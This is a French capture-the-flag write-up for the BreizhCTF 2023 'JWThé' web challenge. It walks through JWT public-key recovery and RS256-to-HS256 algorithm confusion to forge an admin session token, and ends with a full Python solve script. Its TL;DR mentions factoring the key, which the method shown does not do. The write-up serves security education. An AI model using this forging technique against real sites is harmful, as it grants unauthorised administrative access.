BreizhCTF 2023 - JWThé
==========================

### Challenge details

| Event          | Challenge | Category | Points | Solves |
| -------------- | --------- | -------- | ------ | ------ |
| BreizhCTF 2023 | JWThé     | Web      | ???    | ???    |


![tea](https://media.tenor.com/NCRUevhz9jkAAAAC/tea-good.gif)
    
J'aime le thé ; c'est une communion intemporelle entre le corps et l'esprit ! Retrouvez le livre de recettes de l'enseigne et récupérez le flag.

Auteur: [Zeecka](https://twitter.com/Zeecka_)

https://jwthe.ctf.bzh/

### TL;DR

Le mécanisme de session utilisateur repose sur des JWT utilisant une signature RSA (RS256). L'utilisation d'outils spécialisés permet de récupérer la clé publique RSA à partir de 2 de ces jetons. La clé publique ayant déjà été factorisée (notamment sur factordb), il est  possible de récupérer la clé privée et forger des jetons d'administration.

### Méthodologie

Le site propose une boutique d'achat de boissons.

![home.png](home.png)

Une fois la commande effectuée, nous nous retrouvons avec un récapitulatif, associé à un cookie de session au format [JWT](https://jwt.io/).

![command.png](command.png)

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiJBbGV4IiwiZHJpbmsiOiIxIiwic2l6ZSI6IlMiLCJ0b3BwaW5ncyI6IiIsIm5vdGUiOiJTYW5zIGdsYVx1MDBlN29ucyIsInJvbGUiOiJjbGllbnQiLCJpYXQiOjE2NzU2MzUxMDl9.KPpTKnq1deuV2JTqAZDmezdDVMpohF18sqdDuUNCAsI9AcPcnRmfkClXdNxAIupPSfrciDQ2zhkBonY_geQ3eRlhEAQrdZ3UFVMG5z24JIg16pm-Z0wS---mWkLUtP98SUfv703eOiKZuUJt6mNVlf7Y2J5GDANjpLOEHepRrNI
```

L'énumération des pages à l'aide d'outils comme dirsearch nous permet d'identifier l'endpoint d'administration utilisé pour lister les recettes (but du challenge), à savoir `/recipes` et son alias `/recettes`:

```bash
dirsearch -u "https://jwthe.ctf.bzh" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
```
```
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 20115

Output: output.txt

Target: https://jwthe.ctf.bzh/

[00:07:33] Starting: 
[00:07:47] 403 -  939B  - /recipes
[00:07:56] 302 -  189B  - /delete  ->  /
[00:09:12] 403 -  939B  - /recettes
[00:09:29] 405 -  153B  - /command

Task Completed
```

![recettes_403.png](recettes_403.png)

Nous pouvons alors tenter d'altérer le JWT afin de constituer un jeton d'administration. Le décodage du jeton à l'aide du site [jwt.io](http://jwt.io/) nous permet d'en savoir plus sur les attributs du jeton.

![jwtio.png](jwtio.png)

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
{
  "firstname": "Alex",
  "drink": "1",
  "size": "S",
  "toppings": "",
  "note": "Sans glaçons",
  "role": "client",
  "iat": 1675635109
}
```

Il s'agit d'un jeton au format `RS256` possédant notamment un attribut "role". L'utilisation des diverses techniques [mentionnées dans PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md) ne permet pas de forger un jeton valide.

Cependant, l'utilisation de l'algorithme `RS256` implique l'utilisation d'une paire de clé RSA. Afin de vérifier la robustesse des clés de signatures, nous pouvons utiliser l'outil [JWT-Key-Recovery](https://github.com/FlorianPicca/JWT-Key-Recovery), utile pour récupérer une clé RSA **publique** à partir de 2 JWT valides:

```bash
python recover.py eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiJhbGV4IiwiZHJpbmsiOiIxIiwic2l6ZSI6IlMiLCJ0b3BwaW5ncyI6IiIsIm5vdGUiOiIiLCJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNjc1NjM2MDM5fQ.g8bKgcqnvzbr2DPvp_eHAhf_HsIi4B-0VawXG4ygSCLmUNcNHduT4HEBVSWE79-T-qrv5i6tKd0de-v-x49wyYYSz-EKbohA61yat6LCcvpHkbr-VqXNyV2IsW06iuJ6mh2bHGNGwJ96w8rlIPFPQzNOd69xQld1TmfM8zpN7sc eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiJhbGV4IiwiZHJpbmsiOiIxIiwic2l6ZSI6IlMiLCJ0b3BwaW5ncyI6IiIsIm5vdGUiOiIiLCJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNjc1NjM2MDQxfQ.O1FVcAlpU9phb25DUy_eH2eIvv4jKc-z9GhXGsIGwXX2NTkyvSnJP_ykuDsOu5iMCMmUci29cl73OcZIjTj1OWPrQpDpgonl-19xKV_014QJlT6T9NyfsQpcF2XvazfchV1zRbogbq4KKgFDzXW3DBtxtLF4npz1IrYM0fdcgRE
```
```
Recovering public key for algorithm RS256...
Found public RSA key !
n=144643368579758080038799810762792907671669190448854065685922625409060150323780540701698604965270489699974486458103029530366874799597421586371557554188164149588180328577009220855527997708441471901092443236600336620000888420317481366636926577558199654501740076861372892971907237606321053359557829258478318221013
e=65537
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDN+p9a9oMyqRzkae8yLdJcEK0O
0WesH6JiMz+KDrpUwAoAM/KPDnxFnROJDSBHyHEmPVn5x8GqV5lQ9+6l97jdEEcP
o6wkshycM82fgcxOmvtAy4Uoxq/AeplYqplhcUTGVuo4ZldOLmN8ksGmzhWpsOdT
0bkYipHCn5sWZxd21QIDAQAB
-----END PUBLIC KEY-----
```

On récupère ici la clé RSA publique au format ASN1 PEM, ainsi que sous sa forme entière (`n`).
 
Une vulnérabilité courante réside dans le support de plusieurs algorithmes de signature (généralement un algorithme symétrique et un asymétrique):

```python
token = jwt.decode(jeton_base64, secret, algorithms=["RS256", "HS256"])
```

Ici, en supposant que la clé publique RSA est utilisée comme secret vérification de signature (ce qui est généralement le cas), il est possible de forger un jeton valide à l'aide de l'algorithme HS256. En effet, avec cet algorithme symétrique, la clé publique de vérification est similaire à la clé de signature (contrairement à la cryptographie asymétrique).

La génération d'un jeton valide peut être réalisé à l'aide de l'outil [pyJwt](https://pyjwt.readthedocs.io/en/stable/) en prenant soin de changer l'algorithme de signature mais pas la clé, la même structure de contenu et en adaptant le role de notre session:

```python
import jwt  # pip install pyjwt
token = {
    "firstname": "alex",
    "drink": "1",
    "size": "S",
    "toppings": "",
    "note": "",
    "role": "admin",  # on set le rôle admin ici
    "iat": int(time.time())
}

RSA_PUBLIC = open("public.pem").read()
encoded_jwt = jwt.encode(token, RSA_PUBLIC, algorithm="HS256")
print(encoded_jwt)
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdG5hbWUiOiJhbGV4IiwiZHJpbmsiOiIxIiwic2l6ZSI6IlMiLCJ0b3BwaW5ncyI6IiIsIm5vdGUiOiIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NzY1NjI3MDF9.zs71svw8ONgACFp2IwYn3hGAC-IXuMiR1FEkMx-Vy4w
```

Ce jeton peut ensuite être réinjecté dans notre session pour récupérer le flag sur la page de recette (`/recettes`) :

![flag.png](flag.png)

Voici un script de solve python permettant de résoudre le challenge. Ce dernier se base notamment sur les outils mentionnés plus tôt dans l'article.

```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import jwt
import time
import subprocess

URL = "https://jwthe.ctf.bzh/"

s = requests.session()
data = {
    "firstname": "alex",
    "drink": "1",
    "size": "S",
    "toppings": "",
    "note": ""
}

print(f"[+] Generate 2 JWTokens")
s.post(f"{URL}/command", json=data)
t1 = dict(s.cookies)["session"]
time.sleep(2)
s.post(f"{URL}/command", json=data)
t2 = dict(s.cookies)["session"]

print(t1)
print(t2)

print(f"[+] Recovering public key for algorithm RS256... (this may take some time)")
output = subprocess.check_output(f"python3 recover.py {t1} {t2}", shell=True).decode()

assert("Found public RSA key !" in output)

n = int(output.split("n=")[1].split("\n")[0])
public_key = output.split("-----BEGIN PUBLIC KEY-----")[1].split("-----END PUBLIC KEY-----")[0]
public_key = f"-----BEGIN PUBLIC KEY-----{public_key}-----END PUBLIC KEY-----"

with open("public.pem", "w") as f:
    f.write(public_key)
print(public_key)
print(f"n = {n}")

print(f"[+] Signing new admin token with HS256 and public.pem")
token = {
    "firstname": "alex",
    "drink": "1",
    "size": "S",
    "toppings": "",
    "note": "",
    "role": "admin",  # on set le rôle admin ici
    "iat": int(time.time())
}

RSA_PUBLIC = open("public.pem").read()
encoded_jwt = jwt.encode(token, RSA_PUBLIC, algorithm="HS256")

print(f"[+] Query website with new token and get flag")
s.cookies.set("session", None)  # https://stackoverflow.com/questions/25429754/how-to-modify-cookies-in-requests
s.cookies.set("session", encoded_jwt)
r = s.get(f"{URL}/recettes").text
flag = r.split("recettes: ")[1].split(".")[0]
print(f"[+] Flag is: {flag}")
assert(flag == r"BZHCTF{JWThé_à_la_menthe}")
```

#### Flag

`BZHCTF{JWThé_à_la_menthe}`

Auteur: [Zeecka](https://twitter.com/zeecka_)